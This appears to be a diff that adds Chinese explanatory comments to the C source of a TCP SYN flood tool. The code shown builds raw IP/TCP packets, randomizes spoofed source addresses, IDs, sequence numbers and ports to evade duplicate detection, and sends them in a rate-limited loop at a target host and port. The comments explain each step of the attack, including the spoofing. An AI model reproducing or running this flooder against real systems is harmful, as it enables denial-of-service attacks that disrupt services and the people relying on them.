@@ -18,11 +18,13 @@
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
  
+ // 这个实现了TCP洪水攻击(主要是发送TCP SYN包)，和rawudp.c用的方法很像：线性同余产生随机数 + 速率控制，但是rawudp.c是UDP洪水攻击。
 static unsigned long int Q[4096], c = 362436;
 static unsigned int floodport;
 volatile int limiter;
 volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
+ 
  
 void init_rand(unsigned long int x)
 {
@@ -32,6 +34,8 @@ void init_rand(unsigned long int x)
         Q[2] = x + PHI + PHI;
         for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
 }
+
+// 随机数生成器（与rawudp.c一样的线性同余）
 unsigned long int rand_cmwc(void)
 {
         unsigned long long int t, a = 18782LL;
@@ -47,6 +51,8 @@ unsigned long int rand_cmwc(void)
         }
         return (Q[i] = r - x);
 }
+
+//校验和计算
 unsigned short csum (unsigned short *buf, int count)
 {
         register unsigned long sum = 0;
@@ -55,7 +61,7 @@ unsigned short csum (unsigned short *buf, int count)
         while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
         return (unsigned short)(~sum);
 }
- 
+ // 计算TCP包的校验和
 unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
  
         struct tcp_pseudo
@@ -81,6 +87,7 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
         return output;
 }
  
+ // IP头部
 void setup_ip_header(struct iphdr *iph)
 {
         iph->ihl = 5;
@@ -95,6 +102,7 @@ void setup_ip_header(struct iphdr *iph)
         iph->saddr = inet_addr("192.168.3.100");
 }
  
+ // TCP头部
 void setup_tcp_header(struct tcphdr *tcph)
 {
         tcph->source = htons(5678);
@@ -112,15 +120,15 @@ void *flood(void *par1)
 {
         char *td = (char *)par1;
         char datagram[MAX_PACKET_SIZE];
-        struct iphdr *iph = (struct iphdr *)datagram;
-        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
+        struct iphdr *iph = (struct iphdr *)datagram;                   // IP头部
+        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);       // TCP头部
        
         struct sockaddr_in sin;
-        sin.sin_family = AF_INET;
+        sin.sin_family = AF_INET;                                       // IPv4
         sin.sin_port = htons(floodport);
         sin.sin_addr.s_addr = inet_addr(td);
  
-        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);                 // 用于发送任意类型的IP数据包
         if(s < 0){
                 fprintf(stderr, "Could not open raw socket.\n");
                 exit(-1);
@@ -148,7 +156,7 @@ void *flood(void *par1)
                 sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
  
                 iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
-                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);                              // 更新IP地址、ID、校验和、TCP头序列号、源端口， 避免被识别为重复数据包
                 iph->check = csum ((unsigned short *) datagram, iph->tot_len);
                 tcph->seq = rand_cmwc() & 0xFFFF;
                 tcph->source = htons(rand_cmwc() & 0xFFFF);
@@ -159,7 +167,7 @@ void *flood(void *par1)
                 if(i >= limiter)
                 {
                         i = 0;
-                        usleep(sleeptime);
+                        usleep(sleeptime);              // 休眠一段时间以控制发送速率
                 }
                 i++;
         }
